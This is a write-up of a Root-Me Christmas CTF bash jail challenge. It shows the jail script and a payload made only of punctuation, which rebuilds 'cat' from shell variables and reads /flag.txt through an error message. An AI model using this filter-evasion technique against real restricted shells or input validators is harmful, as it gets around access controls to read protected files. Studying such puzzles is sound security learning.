---
title: "bash-jail"
date: 2025-12-24T12:00:09+02:00
---

# day8 of root-me x-mas event

This is a bash jail challenge.

```bash
#!/bin/bash

PATH=$(/usr/bin/getconf PATH || /bin/kill $$)

#######################################################
#              |>>>                    |>>>          #
#              |                       |             #
#          _  _|_  _               _  _|_  _         #
#         |;|_|;|_|;|             |;|_|;|_|;|        #
#         \\..      /             \\..      /        #
#          \\..    /               \\..    /         #
#           \\..  /                 \\..  /          #
#            ||||                     ||||           #
#            ||||                     ||||           #
#   ______________________________________________   #
#  /______________________________________________/| #
# |                                              | | #
# |      |   |   |   |   |   |   |   |   |       | | #
# |      |___|___|___|___|___|___|___|___|       | | #
# |                                              | | #
# |              "Help me please..."             | | #
# |______________________________________________|/  #
#######################################################

function check_input() {
    if [[ $1 =~ '..' || $1 =~ './' || $1 =~ [[:space:]]'/' ]]
    then
        return 0
    fi
    if [[ $1 =~ [[:alnum:][:space:]] ]];
    then
        return 0
    fi
    if [[ $1 =~ '<' || $1 =~ '>' ]];
    then
        return 0
    fi

    return 1
}

# Todo remove this shit... it can be retrieved by the player ?! >_<
flag=`cat "/flag.txt"`

while :
do
    input=""
    echo -n "Enter the input: "
    read input
    if check_input "$input"
        then
                echo -e '\033[0;31mRestricted characters has been used\033[0m'
        else
                output=`env -i PATH=$HOME/bin/ /bin/bash --noprofile --norc --restricted -c "$input" < /dev/null`
                echo "Command executed"
        fi
done
```

We only can use ponctuation characters and no redirection "<" ">".

## Reminder:

The error message leaks infos.

```bash
"$_" is the last command -> "/bin/bash"
"$-" is the arguments passed to bash -> "hrBc"
"~" is the $HOME variable -> "/root"
"~/???/???" expands to "/root/bin/cat" [+] We have cat in our PATH.
```

## get letters

We need to get numbers to make offsets.

```bash
"___=${#_[*]}" is the length of array _ -> 1
```
We can just sum it to get the desired number.

with 
```bash
__=$_;___=${#_[*]};____=$___;((____+=$____));((____+=$____));((____+=$___));((____+=$___));_______=${__:____:___}
      ___=1        ____=1       ____=2          ____=4          ____=5         ____=6         
```
We store ${/bin/bash:6:1}, which is "a", in variable "_______".

```bash
__=$-;___=${#_[*]};____=$___;((____+=$___));((____+=$___));______=${__:____} ## get c
__=~;___=${#_[*]};____=$___;((____+=$____));((____+=$____));________=${__:____} ## get t
```

## we get "cat"

To get the string /flag.txt we can use bash expansion such as /????.???

Now just execute it 
```bash
__=/????.???;$({${______}${_______}${________},$__}) # $({cat,/flag.txt})
```

Run this commands in one line give us an error:
```bash
/bin/bash: line 1: RM{0mG_Y3S_1_kn3w_y0u_w0uld_h3l/.../ME<<<3}: command not found
```

Which is the flag !!!

### Thanks Mistrale <3
